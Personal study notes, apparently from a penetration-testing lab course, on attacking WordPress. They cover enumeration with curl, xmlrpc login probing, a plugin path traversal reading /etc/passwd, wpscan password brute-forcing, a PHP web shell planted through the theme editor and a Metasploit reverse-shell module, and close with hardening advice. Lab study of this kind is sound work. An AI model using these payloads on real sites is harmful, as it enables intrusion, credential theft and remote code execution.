@@ -1,0 +1,266 @@
+HACKING WORDPRESS
+====================
+wordpress es el CMS (Content Management System) mas popular, cubriendo un tercio de todos los sitios web en el mundo.
+
+Los CMS, son herramientas que ayudan a construir sitios web in tener que saber programar todo desde cero, los CMS hacen el trabajo duro por ti, en pocas palabras.
+
+Los usuarios pueden subir archivos/media sin interactuar con el server web, desde un portal via FTP O SFTP.
+
+A CMS is made up of two key components:
+
+ - A Content Management Application (CMA) - the interface used to add and manage content.
+ - A Content Delivery Application (CDA) - the backend that takes the input entered into
+   the CMA and assembles the code into a working, visually appealing website.
+
+Los CMS tienen todo en uno a la hora de programar un sitio web y tambien tiene una extensa gama de
+configuraciones para limitar los vectores ataques, pero muchas veces no es correctamente configurado.
+
+ LAMP stack (Linux operating system, Apache HTTP Server, MySQL database, and the PHP programming language).
+---------------------------
+|  Wordpress structure:   |
+---------------------------
+
+All WordPress supporting files and directories will be accessible in the webroot located at /var/www/html:
+_______
+tree -L 1 /var/www/html
+.
+├── index.php            <======= homepage of WordPress
+├── license.txt          <======= useful information such as the version WordPress installed
+├── wp-admin.php         <======= contains the login page for administrator access
+                                  and the backend dashboard. Once a user has logged
+                                  in, they can make changes to the site based on
+                                  their assigned permissions.
+                                  
+                                  The login page can be located at one of the following paths:
+                                   - /wp-admin/login.php
+                                   - /wp-admin/wp-login.php
+                                   - /login.php
+                                   - /wp-login.php
+
+├── wp-activate.php      <======= used for the email activation process when setting up a new WordPress site.
+├── xmlrpc.php           <======= A file representing a feature of WordPress that enables data to be
+                                  transmitted with HTTP acting as the transport mechanism and XML as
+                                  the encoding mechanism. This type of communication has been replaced
+                                  by the WordPress REST API.
+
+└── wp-config.php        <======= file contains information required by WordPress to connect to the database,
+                                  such as the database name, database host, username and password,
+                                  authentication keys and salts, and the database table prefix.
+                                  This configuration file can also be used to activate DEBUG mode,
+                                  which can useful in troubleshooting.
+______________________________________
+tree -L 1 /var/www/html/wp-content
+.
+├── index.php
+├── plugins
+└── themes
+______________________________________
+tree -L 1 /var/www/html/wp-includes
+.
+├── <SNIP>
+├── theme.php
+├── update.php
+├── user.php
+├── vars.php
+├── version.php
+├── widgets
+├── widgets.php
+├── wlwmanifest.xml
+├── wp-db.php
+└── wp-diff.php
+==========================================================
+---------------------------
+|  Wordpress User Roles:  |
+---------------------------
+
+ - Administrator: 	
+ - Editor: Can publish and manage posts, including the posts of other users.
+ - Author: Can publish and manage their own posts.
+ - Contributor: Can write and manage their own posts but cannot publish them.
+ - Subscriber: Normal users who can browse posts and edit their profiles.
+
+Ranges by hierarchy: 
+1- Administrator
+2- Editors & Authors
+==========================================================
+-------------------------------------
+| Wordpress Core Version Enumeration|
+-------------------------------------
+This is helpful when searching for common misconfigurations
+such as default passwords that may be set for certain
+versions of an application and searching for known vulnerabilities
+for a particular version number.
+
+curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
+==========================================================
+-------------------------------------
+|  Plugins and Themes Enumeration   |
+-------------------------------------
+curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
+-------------------------------------
+curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
+------------------------------------
+|   Plugins Active Enumeration     |
+------------------------------------
+curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
+------------------------------------
+curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin
+------------------------------------
+We could also write a simple bash script or use wfuzz or WPScan.
+===========================================================
+------------------------
+|  Directory Indexing  |
+------------------------
+curl -s -X GET http://94.237.56.76:48908/wp-content/plugins/mail-masta/ | html2text
+------------------------
+curl -s -X GET http://94.237.56.76:48908/wp-content/plugins/mail-masta/inc/flag.txt | html2text
+[search through any directories]
+============================================================
+-----------------------
+|  User Enumeration   |
+-----------------------
+http://blog.inlanefreight.com/?author=1
+------------------------------------
+curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
+------------------------------------
+curl -s -I -X GET http://blog.inlanefreight.com/?author=1
+------------------------------------
+curl -s -I -X GET http://blog.inlanefreight.com/?author=100
+------------------------------------
+=============================================================
+---------
+| Login |
+---------
+- POST request against xmlrpc.php
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+------------------------------------
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+
+______________________________
+RESOURCES FOR LOGIN AT XMLRPC:
+______________________________
+https://www.briskinfosec.com/blogs/blogsdetail/XML-Rpc-Attack
+https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
+______________________________
+REQUEST PAYLOAD [method calls of your target]
+
+POST /xmlrpc.php HTTP/1.1
+Host: 94.237.56.76:54589
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
+Sec-GPC: 1
+Accept-Language: en-US,en
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Length: 135
+Content-Type: application/x-www-form-urlencoded
+
+<?xml version="1.0" encoding="utf-8"?> 
+
+<methodCall> 
+
+<methodName>
+system.listMethods
+</methodName> 
+
+<params>
+</params> 
+
+</methodCall>
+=============================================================================
+-------------------
+| WPScan Overview |
+-------------------
+=============================================================================
+--------------------
+|WPScan Enumeration|
+--------------------
+
+wpscan --url http://83.136.252.24:36493/ -e ap -v
+
+=============================================================================
+----------------------------------
+| Exploiting a vulenrable plugin |
+----------------------------------
+
+/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+
+=============================================================================
+-----------------------------
+| Attacking Wordpress users |
+-----------------------------
+
+/xmlrpc.php
+
+wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://[URL]
+
+wpscan --password-attack xmlrpc -t 20 -U roger -P /home/l4b/Downloads/thebuffet/wordlists/seclistsIMPROVED/Passwords/Leaked-Databases/rockyou.txt --url http://94.237.59.206:37244/
+
+=============================================================================
+--------------------------------------------------------------
+| RCE VIA THE THEME EDITOR - Attacking the WordPress Backend |
+--------------------------------------------------------------
+1- Find the login panel, login as: [admin:sunshine1]
+2- Click on Appearance on the side panel and select Theme Editor
+3- Choose a theme and click on Select. Next, choose a non-critical file such as 404.php to modify and add a web shell.
+4- add the webshell (file on the same path of notes.txt): system($_GET['cmd']); 
+5- curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
+6- http://94.237.59.206:37244/wp-content/themes/twentyseventeen/404.php?cmd=less%20/home/wp-user/flag.txt
+
+404.php?cmd=id
+curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
+
+===========================================================================
+---------------------------------------
+| Attacking wordpress with metasploit |
+---------------------------------------
+
+msfconsole
+To obtain the reverse shell, we can use the wp_admin_shell_upload module. We can easily search for it inside MSF:
+search wp_admin
+use 0
+options
+set rhosts blog.inlanefreight.com
+set username admin
+set password Winter2020
+set lhost 10.10.16.8
+run
+getuid
+
+==========================================================================
+-----------------------
+| WordPress Hardening |
+-----------------------
+
+- Perform Regular Updates
+- We can even modify the wp-config.php file to enable automatic updates by inserting the following lines:
+  define( 'WP_AUTO_UPDATE_CORE', true );
+  add_filter( 'auto_update_plugin', '__return_true' );
+  add_filter( 'auto_update_theme', '__return_true' );
+- Only install trusted themes and plugins from the WordPress.org website. 
+- Enhance WordPress Security, Here are a few examples of popular WordPress security plugins:
+  - Securi Security
+  - iThemes Security
+  - Wordfence Security
+- User Management
+   - Disable the standard admin user and create accounts with difficult to guess usernames
+   - Enforce strong passwords
+   - Enable and enforce two-factor authentication (2FA) for all users
+   - Restrict users' access based on the concept of least privilege
+   - Periodically audit user rights and access. Remove any unused accounts
+     or revoke access that is no longer needed
+
+Configuration Management
+ - Install a plugin that disallows user enumeration so 
+   an attacker cannot gather valid usernames to be used in a password spraying attack
+ - Limit login attempts to prevent password brute-forcing attacks
+ - Rename the wp-admin.php login page or relocate it to 
+   make it either not accessible to the internet or only
+   accessible by certain IP addresses.
+
+
+
+
+
